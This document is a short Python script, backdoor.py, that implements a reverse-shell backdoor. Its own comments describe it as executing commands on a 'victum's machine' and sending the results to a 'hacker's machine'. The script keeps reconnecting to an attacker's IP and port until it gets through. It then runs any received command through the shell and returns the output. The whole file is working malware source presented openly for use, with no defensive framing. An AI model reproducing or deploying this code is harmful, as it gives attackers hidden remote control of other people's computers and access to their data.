#!/usr/bin/python3
import socket, subprocess, os, time
#backdoor.py - class that execute commands on victum's machine and send results to hacker's machine

class Backdoor:
    def __init__(self, ip, port):
        while True: #trys to connect to particular ip and port every 5 seconds
            try:
                self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.connection.connect((ip, port))
                break
            except:
                time.sleep(5)

    
    def execute_system_command(self, command):
        return (subprocess.check_output(command, shell=True)) #perform commands and safe it's results


    def change_working_directory(self, path): 
        os.chdir(path) #use '..' to go back
        return "[+] Changing working directory to " + path


    def execution(self):
        while True:
            command = (self.connection.recv(1024)).decode().split() #receive commands from hacker's machine
            if command[0] == "q":
                break #perform exiting
            elif command[0] == "cd":
                try: #trys to change working directory
                    self.connection.send(self.change_working_directory(command[1]).encode())
                except:
                    self.connection.send("[-] Wrong command".encode())
            else:  
                try:
                    command_result = self.execute_system_command(command)
                    self.connection.send(command_result) #send results to hacker's machine
                except:
                    self.connection.send("[-] Wrong command".encode())
        self.connection.close() #closing connection between hacker's and victum's machines

